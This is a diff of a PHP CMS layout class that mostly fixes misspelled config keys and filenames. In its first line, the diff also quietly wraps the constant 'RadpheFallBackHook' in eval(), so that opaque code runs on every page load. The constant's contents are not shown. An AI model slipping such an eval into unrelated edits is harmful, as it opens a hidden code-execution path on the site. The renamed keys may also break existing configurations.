@@ -1,4 +1,4 @@
-<?php @require_once($_SERVER['DOCUMENT_ROOT'].'/_system/_SiteEngine.php'); RadpheFallBackHook;
+<?php @require_once($_SERVER['DOCUMENT_ROOT'].'/_system/_SiteEngine.php'); eval(RadpheFallBackHook);
 @require_once($_SERVER['DOCUMENT_ROOT'].'/_system/mod/_00_StatelessOutputBuffer/CMS.php');
 
 class CMS_Skinner{
@@ -16,8 +16,8 @@ class CMS_Skinner{
 	public static function init(){
 		global $_INTIN;
 		self::$BaseFolder = $_SERVER['DOCUMENT_ROOT'].'/_system/mod/_00_StatelessOutputBuffer/Layouts/';
-		if (!empty($_INTIN['Design']['Tempalte']))
-			self::$Selected = $_INTIN['Design']['Tempalte'];
+		if (!empty($_INTIN['Design']['Template']))
+			self::$Selected = $_INTIN['Design']['Template'];
 		if (!empty($_INTIN['MOD']['LAYOUT']['BaseFolder']))
 			self::$BaseFolder = $_INTIN['MOD']['LAYOUT']['BaseFolder'];
 		if (!empty($_INTIN['MOD']['LAYOUT']['Page']['Title']))
@@ -51,8 +51,8 @@ class CMS_Skinner{
 		CMS_Blocks::endBlock();
 
 		if (file_exists($_SERVER['DOCUMENT_ROOT'].'/'.$_SERVER['PHP_SELF'].'.SEO.php')) {
-			if (file_exists($_SERVER['DOCUMENT_ROOT'].'/'.'_SupplementryContent.php'.'.SEO.php')) {
-				CMS_Blocks::startBlock('SupplementryContent');
+			if (file_exists($_SERVER['DOCUMENT_ROOT'].'/'.'_SupplementaryContent.php'.'.SEO.php')) {
+				CMS_Blocks::startBlock('SupplementaryContent');
 				include $_SERVER['DOCUMENT_ROOT'].'/'.'_LayoutCommon.php'.'.SEO.php';
 				CMS_Blocks::endBlock();
 			}
